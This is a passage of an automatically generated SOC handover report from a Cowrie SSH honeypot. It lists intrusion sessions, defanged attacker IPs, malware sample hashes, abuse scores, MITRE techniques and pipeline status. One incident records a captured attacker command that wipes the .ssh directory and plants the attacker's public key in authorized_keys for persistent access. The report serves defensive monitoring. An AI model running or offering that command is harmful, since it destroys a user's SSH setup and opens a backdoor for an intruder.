- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aabf9f413b2

| Field | Detail |
|---|---|
| **Source IP** | `83.235.16[.]111` |
| **First Seen** | 2026-05-11 21:43 |
| **Last Seen** | 2026-05-11 21:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:43:18` | `cowrie.session.connect` |
| `2026-05-11 21:43:18` | `cowrie.client.version` |
| `2026-05-11 21:43:19` | `cowrie.client.kex` |
| `2026-05-11 21:43:19` | `cowrie.login.success` |
| `2026-05-11 21:43:20` | `cowrie.session.params` |
| `2026-05-11 21:43:20` | `cowrie.command.input` |
| `2026-05-11 21:43:20` | `cowrie.command.failed` |
| `2026-05-11 21:43:20` | `cowrie.log.closed` |
| `2026-05-11 21:43:21` | `cowrie.session.params` |
| `2026-05-11 21:43:21` | `cowrie.command.input` |
| `2026-05-11 21:43:21` | `cowrie.session.file_download` |
| `2026-05-11 21:43:21` | `cowrie.log.closed` |
| `2026-05-11 21:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.235.16[.]111` to AbuseIPDB if not already reported
- [ ] Block `83.235.16[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-135f9545ba46

| Field | Detail |
|---|---|
| **Source IP** | `83.235.16[.]111` |
| **First Seen** | 2026-05-11 21:43 |
| **Last Seen** | 2026-05-11 21:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:43:24` | `cowrie.session.connect` |
| `2026-05-11 21:43:24` | `cowrie.client.version` |
| `2026-05-11 21:43:24` | `cowrie.client.kex` |
| `2026-05-11 21:43:25` | `cowrie.login.success` |
| `2026-05-11 21:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.235.16[.]111` to AbuseIPDB if not already reported
- [ ] Block `83.235.16[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d56c67a92886

| Field | Detail |
|---|---|
| **Source IP** | `106.12.144[.]153` |
| **First Seen** | 2026-05-11 22:37 |
| **Last Seen** | 2026-05-11 22:43 |
| **Session Duration** | 328s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 22:37:41` | `cowrie.session.connect` |
| `2026-05-11 22:37:41` | `cowrie.client.version` |
| `2026-05-11 22:37:41` | `cowrie.client.kex` |
| `2026-05-11 22:38:09` | `cowrie.login.success` |
| `2026-05-11 22:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.144[.]153` to AbuseIPDB if not already reported
- [ ] Block `106.12.144[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `77.54.41[.]203` | **19** | 2026-05-11 21:25 | 2026-05-11 21:40 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.12.144[.]153` | **9** | 2026-05-11 22:31 | 2026-05-11 22:39 | 10m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `107.170.65[.]169` | 1 | 2026-05-11 21:49 | 2026-05-11 21:50 | 2s | 0 | `T1592` | 🟢 LOW |
| `193.24.211[.]100` | 1 | 2026-05-11 22:07 | 2026-05-11 22:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `40.117.97[.]0` | 1 | 2026-05-11 21:37 | 2026-05-11 21:37 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `51.68.226[.]87` | 1 | 2026-05-11 22:40 | 2026-05-11 22:40 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `83.235.16[.]111` | 1 | 2026-05-11 21:43 | 2026-05-11 21:43 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 8/100 | 🟢 LOW | **20/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `107.170.65[.]169` | US | DigitalOcean, LLC | **100** ⚠️ | 46 |
| `106.12.144[.]153` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 4 |
| `193.24.211[.]100` | BG | Layer7 Networks GmbH | **100** ⚠️ | 5 |
| `77.54.41[.]203` | PT | DSL | **100** ⚠️ | 10 |
| `51.68.226[.]87` | FR | OVH SAS | **100** ⚠️ | 50 |
| `40.117.97[.]0` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `83.235.16[.]111` | GR | Ote SA (Hellenic Telecommunications Organisation) | **100** ⚠️ | 50 |
| `37.49.227[.]37` | NL | ESTOXY OU | **74** | 5 |
| `181.120.53[.]173` | PY | Telecel S.A. | **53** | 0 |
| `38.17.157[.]11` | VE | TELECOMUNICACIONES G-NETWORK, C.A. | **32** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 67 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 33 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 26 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 16 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 16 |

---

## 🔕 False Positive Summary (245 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 7 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 18 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 212 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 311 cases |
| Tool 34  | Credential Extractor        | ✅ 59 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 20 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 245 filtered (78.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 33 priority case(s) shown individually · 7 recon entry/entries in table (2 group(s) consolidating 28 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-11T22:59:05Z_
